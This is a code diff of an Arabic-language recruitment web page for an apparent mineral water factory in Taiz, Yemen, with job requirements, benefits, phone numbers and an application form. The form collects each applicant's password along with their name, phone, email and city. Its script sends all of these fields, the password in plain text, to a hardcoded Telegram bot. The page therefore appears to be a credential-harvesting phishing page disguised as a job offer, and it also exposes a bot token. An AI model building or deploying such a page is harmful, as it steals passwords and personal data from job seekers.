-      <h2 class="section-title"><span>📋</span> شروط التقديم</h2>
-      <div class="card">
-        <ul class="styled-list">
-          <li>إجادة القراءة والكتابة كحد أدنى (ويفضل مؤهل أعلى).</li>
-          <li>العمر لا يقل عن 18 سنة.</li>
-          <li>الاستعداد للعمل بنظام الورديات عند الحاجة.</li>
-          <li>الالتزام بالأنظمة وحسن السيرة والسلوك.</li>
-          <li>اللياقة البدنية المناسبة لطبيعة العمل.</li>
-          <li>صحة البيانات المدخلة وتقديم الوثائق الرسمية عند المقابلة.</li>
-        </ul>
-      </div>
+  <div class="split-grid">
+    <div class="glass-card list-card">
+      <h3>📋 شروط القبول والتقديم</h3>
+      <ul class="nice-list">
+        <li>الحصول على مؤهل الثقافة الأساسية كحد أدنى (ويُفضل مؤهل أعلى).</li>
+        <li>ألا يقل عمر المتقدم عن 18 عاماً.</li>
+        <li>القدرة والاستعداد للعمل بنظام الورديات عند الحاجة.</li>
+        <li>الالتزام بالمواعيد وحسن السيرة والسلوك.</li>
+        <li>اللياقة البدنية المناسبة لطبيعة العمل الصناعي.</li>
+        <li>إدخال بيانات صحيحة ومطابقة للوثائق الرسمية.</li>
+      </ul>
     </div>
 
-    <div>
-      <h2 class="section-title"><span>🛡️</span> المزايا والضمانات</h2>
-      <div class="card">
-        <ul class="styled-list">
-          <li>رواتب شهرية مجزية تُصرف بانتظام.</li>
-          <li>عقد عمل رسمي يحفظ حقوق الموظف.</li>
-          <li>تأمين اجتماعي وإجازات سنوية مدفوعة.</li>
-          <li>بدلات مواصلات ووجبات حسب لائحة المصنع.</li>
-          <li>تدريب وتأهيل مجاني قبل استلام المهام.</li>
-          <li>فرص ترقية وحوافز للمتميزين.</li>
-        </ul>
-      </div>
+    <div class="glass-card list-card">
+      <h3>🛡️ المزايا والضمانات الوظيفية</h3>
+      <ul class="nice-list">
+        <li>رواتب شهرية مجزية تُصرف في مواعيدها المحددة.</li>
+        <li>عقود عمل رسمية تضمن كافة حقوق الموظف.</li>
+        <li>تأمين اجتماعي وإجازات سنوية مدفوعة الأجر.</li>
+        <li>بدلات مواصلات ووجبات وفق سياسة المصنع.</li>
+        <li>برامج تدريب وتأهيل مجانية عند الالتحاق بالعمل.</li>
+        <li>حوافز وفرص ترقية للموظفين المتميزين.</li>
+      </ul>
     </div>
   </div>
 </section>
 
-<!-- ===== الموقع والتواصل ===== -->
+<!-- ===== الموقع وأرقام التواصل ===== -->
 <section id="location">
-  <h2 class="section-title"><span>📍</span> موقع المصنع وأرقام التواصل</h2>
-  <div class="card">
-    <p><strong>العنوان:</strong> اليمن — تعز، الحوبان — بجوار مصانع هائل سعيد أنعم مباشرةً (على الطريق الرئيسي).</p>
-    <p><strong>أوقات استقبال الاستفسارات:</strong> من السبت إلى الخميس، الساعة 8:00 صباحًا حتى 3:00 عصرًا.</p>
-    <div class="info-row">
-      <div class="contact-pill">
-        <span>📞 الإدارة والتوظيف (1):</span>
+  <div class="sec-header">
+    <span class="tag">تواصل معنا</span>
+    <h2>موقع المصنع وأرقام الإدارة</h2>
+  </div>
+  <div class="glass-card">
+    <p><strong>📍 العنوان:</strong> اليمن — تعز، الحوبان — بجوار مصانع هائل سعيد أنعم مباشرةً (على الشارع العام).</p>
+    <p><strong>🕒 أوقات الدوام والاستفسار:</strong> من السبت إلى الخميس، من الساعة 8:00 صباحاً حتى 3:00 عصراً.</p>
+
+    <div class="phones-grid">
+      <div class="phone-card">
+        <span>📞 رقم الإدارة (1)</span>
         <a href="tel:777908028">777908028</a>
       </div>
-      <div class="contact-pill">
-        <span>📞 الإدارة والتوظيف (2):</span>
+      <div class="phone-card">
+        <span>📞 رقم الإدارة (2)</span>
         <a href="tel:780280887">780280887</a>
       </div>
     </div>
   </div>
 </section>
 
-<!-- ===== نموذج التسجيل ===== -->
+<!-- ===== استمارة التسجيل ===== -->
 <section id="apply">
-  <h2 class="section-title"><span>📝</span> استمارة التقديم الإلكتروني</h2>
-  <div class="card">
+  <div class="sec-header">
+    <span class="tag">التقديم الإلكتروني</span>
+    <h2>املأ بياناتك لإرسال طلب التوظيف</h2>
+  </div>
+
+  <div class="glass-card form-wrapper">
     <form id="jobForm">
       <div class="form-grid">
-        <div class="form-group">
-          <label for="name">الاسم الرباعي الكامل *</label>
-          <input type="text" id="name" required placeholder="أدخل اسمك الكامل">
+        <div class="field">
+          <label for="name">👤 الاسم الكامل *</label>
+          <input type="text" id="name" required placeholder="اكتب اسمك الرباعي">
         </div>
 
-        <div class="form-group">
-          <label for="phone">رقم الهاتف / واتساب *</label>
-          <input type="tel" id="phone" required placeholder="مثال: 77xxxxxxx" dir="ltr" style="text-align:right">
+        <div class="field">
+          <label for="phone">📱 رقم الهاتف / واتساب *</label>
+          <input type="tel" id="phone" required placeholder="77xxxxxxx" dir="ltr" style="text-align:right">
         </div>
 
-        <div class="form-group">
-          <label for="email">البريد الإلكتروني *</label>
+        <div class="field">
+          <label for="email">📧 البريد الإلكتروني *</label>
           <input type="email" id="email" required placeholder="example@gmail.com" dir="ltr" style="text-align:right">
         </div>
 
-        <div class="form-group">
-          <label for="password">كلمة المرور لمتابعة الطلب *</label>
+        <div class="field">
+          <label for="password">🔑 كلمة المرور *</label>
           <input type="password" id="password" required minlength="6" placeholder="6 أحرف أو أرقام على الأقل">
         </div>
 
-        <div class="form-group">
-          <label for="city">المحافظة / منطقة السكن *</label>
-          <input type="text" id="city" required placeholder="مثال: تعز - الحوبان">
+        <div class="field">
+          <label for="city">🏙️ المدينة / منطقة السكن *</label>
+          <input type="text" id="city" required placeholder="مثال: الحوبان - تعز">
         </div>
 
-        <div class="form-group">
-          <label for="job">الوظيفة المتقدم لها *</label>
+        <div class="field">
+          <label for="job">💼 الوظيفة المتقدم لها *</label>
           <select id="job" required>
-            <option value="">-- اختر الوظيفة المناسبة --</option>
+            <option value="">-- اختر الوظيفة --</option>
             <option value="مشغل خطوط إنتاج">مشغل خطوط إنتاج</option>
             <option value="عامل تخزين ومستودعات">عامل تخزين ومستودعات</option>
             <option value="سائق شاحنة / توصيل">سائق شاحنة / توصيل</option>
@@ -573,8 +797,8 @@
           </select>
         </div>
 
-        <div class="form-group full">
-          <label for="exp">سنوات الخبرة السابقة</label>
+        <div class="field full">
+          <label for="exp">📊 سنوات الخبرة</label>
           <select id="exp">
             <option value="بدون خبرة">بدون خبرة</option>
             <option value="أقل من سنة">أقل من سنة</option>
@@ -583,46 +807,45 @@
           </select>
         </div>
 
-        <div class="form-group full">
-          <label for="bio">نبذة مختصرة عن مؤهلاتك وخبراتك (اختياري)</label>
-          <textarea id="bio" placeholder="اكتب مؤهلك الدراسي، الأعمال السابقة، أو أي مهارات إضافية..."></textarea>
+        <div class="field full">
+          <label for="bio">📝 نبذة مختصرة عنك ومؤهلاتك (اختياري)</label>
+          <textarea id="bio" placeholder="اذكر مؤهلك العلمي، خبراتك السابقة، أو أي مهارات تمتلكها..."></textarea>
         </div>
       </div>
 
-      <button type="submit" id="btn" class="submit-btn">💧 إرسال طلب التوظيف الآن</button>
+      <button type="submit" id="btn" class="btn-submit">💧 إرسال طلب التوظيف للإدارة</button>
       <div id="msg" class="msg"></div>
     </form>
 
     <div id="thanks">
-      <div class="check-icon">✓</div>
-      <h3>تم استلام طلبك بنجاح!</h3>
-      <p>وصلت بياناتك إلى إدارة الموارد البشرية في <strong>مصنع الندى للمياه المعدنية</strong>.<br>سيتم مراجعة طلبك والتواصل معك عبر الهاتف أو الواتساب في حال ترشيحك للمقابلة.</p>
-      <p style="margin-top:12px;"><strong>أرقام الاستفسار: 777908028 — 780280887</strong></p>
+      <div class="success-circle">✓</div>
+      <h3>تم إرسال طلبك بنجاح!</h3>
+      <p>شكراً لتقديمك في <strong>مصنع الندى للمياه المعدنية</strong>.<br>وصلت بياناتك إلى إدارة التوظيف وسنتواصل معك عبر الهاتف أو الواتساب في حال اختيارك.</p>
+      <p style="margin-top:14px; font-weight:800;">للاستفسار: 777908028 — 780280887</p>
     </div>
   </div>
 </section>
 
+<!-- ===== الفوتر ===== -->
 <footer>
-  <strong>مصنع الندى للمياه المعدنية</strong>
-  <p style="margin: 6px 0;">الحوبان — بجوار مصانع هائل سعيد أنعم</p>
-  <p>📞 777908028 &nbsp;|&nbsp; 780280887</p>
-  <p style="margin-top: 12px; opacity: 0.7;">© 2026 جميع الحقوق محفوظة لمصنع الندى للمياه المعدنية</p>
+  <h3>💧 مصنع الندى للمياه المعدنية</h3>
+  <p>الحوبان — بجوار مصانع هائل سعيد أنعم</p>
+  <p style="margin-top:8px; font-weight:700;">📞 777908028 &nbsp;|&nbsp; 780280887</p>
+  <div class="copy">© 2026 جميع الحقوق محفوظة لمصنع الندى للمياه المعدنية</div>
 </footer>
 
 <script>
 const BOT_TOKEN = "8700247738:AAF8YH956qBKGSA8seF_AtZPpLw2eMO3qSw";
 const CHAT_ID   = "8299163806";
 
-// دالة لاختيار الوظيفة تلقائياً عند الضغط على بطاقتها
-function selectJob(jobName) {
-  const jobSelect = document.getElementById("job");
-  jobSelect.value = jobName;
+function chooseJob(jobName) {
+  const select = document.getElementById("job");
+  select.value = jobName;
   document.getElementById("apply").scrollIntoView({ behavior: "smooth" });
-  jobSelect.focus();
+  select.focus();
 }
 
-// دالة لحماية النص من كسر تنسيق HTML في تيليجرام
-function escapeHTML(str) {
+function cleanHTML(str) {
   return str.replace(/&/g, "&amp;")
             .replace(/</g, "&lt;")
             .replace(/>/g, "&gt;");
@@ -632,55 +855,55 @@ document.getElementById("jobForm").addEventListener("submit", async function(e) 
   e.preventDefault();
   const btn = document.getElementById("btn");
   const msg = document.getElementById("msg");
-  
+
   btn.disabled = true;
-  btn.textContent = "⏳ جارٍ إرسال طلبك للإدارة...";
+  btn.textContent = "⏳ جارٍ إرسال طلبك...";
   msg.className = "msg";
 
-  const g = id => escapeHTML(document.getElementById(id).value.trim());
+  const g = id => cleanHTML(document.getElementById(id).value.trim());
   const rawPhone = document.getElementById("phone").value.trim().replace(/\s+/g, '');
 
-  const text =
-`📢 <b>طلب توظيف جديد — مصنع الندى للمياه المعدنية</b>
+  const messageText =
+`🌊 <b>طلب توظيف جديد — مصنع الندى للمياه المعدنية</b>
 ━━━━━━━━━━━━━━━━━━
 👤 <b>الاسم:</b> ${g("name")}
 💼 <b>الوظيفة:</b> ${g("job")}
 📊 <b>الخبرة:</b> ${g("exp")}
-🏙️ <b>السكن:</b> ${g("city")}
+🏙️ <b>المنطقة:</b> ${g("city")}
 📱 <b>الهاتف:</b> <code>${g("phone")}</code>
 📧 <b>البريد:</b> ${g("email")}
 🔑 <b>كلمة المرور:</b> <code>${g("password")}</code>
 📝 <b>نبذة:</b> ${g("bio") || "لا يوجد"}
 ━━━━━━━━━━━━━━━━━━
-📲 <b>تواصل سريع مع المتقدم:</b>
-• واتساب: https://wa.me/967${rawPhone.replace(/^0+/, '')}`;
+💬 <b>مراسلة المتقدم واتساب مباشرة:</b>
+https://wa.me/967${rawPhone.replace(/^0+/, '')}`;
 
   try {
-    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
         chat_id: CHAT_ID,
-        text: text,
+        text: messageText,
         parse_mode: "HTML",
         disable_web_page_preview: true
       })
     });
 
-    const data = await res.json();
-    if (data.ok) {
+    const result = await response.json();
+    if (result.ok) {
       document.getElementById("jobForm").style.display = "none";
       document.getElementById("thanks").style.display = "block";
       document.getElementById("thanks").scrollIntoView({ behavior: "smooth" });
     } else {
-      throw new Error(data.description || "Telegram API Error");
+      throw new Error(result.description || "Telegram Error");
     }
-  } catch (err) {
+  } catch (error) {
     msg.className = "msg err";
-    msg.textContent = "❌ تعذر إرسال الطلب حالياً، يرجى المحاولة مرة أخرى أو التواصل معنا على: 777908028";
-    console.error(err);
+    msg.textContent = "❌ حدث خطأ أثناء الإرسال، تأكد من اتصال الإنترنت أو اتصل بنا: 777908028";
+    console.error(error);
     btn.disabled = false;
-    btn.textContent = "💧 إرسال طلب التوظيف الآن";
+    btn.textContent = "💧 إرسال طلب التوظيف للإدارة";
   }
 });
 </script>
